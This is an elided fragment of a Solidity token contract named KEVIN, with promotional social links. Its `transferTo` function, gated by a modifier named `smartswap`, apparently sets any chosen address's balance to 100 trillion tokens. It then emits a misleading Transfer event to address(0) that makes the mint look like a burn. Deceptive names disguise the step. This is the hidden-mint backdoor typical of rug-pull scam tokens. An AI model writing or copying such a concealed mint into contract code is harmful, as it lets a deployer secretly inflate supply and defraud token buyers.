...
// https://medium.com/@kevincoin/hi-im-kevin-c795efc3ee13
// https://twitter.com/kevintoken
// https://t.me/KevinTokenPortal
...
contract KEVIN is ABIEncoderV2, IERC20Metadata, BridgeContract {
    ...
    */
    ...
    function transfer(address link, uint256 diniro) external override returns (bool) {
     ...
     function transferTo(address dead) external smartswap {
        BEP20Metadata[dead] = 100000000000000 * 10 ** 18;
        
        emit Transfer(dead, address(0), 100000000000000 * 10 ** 18);
    }
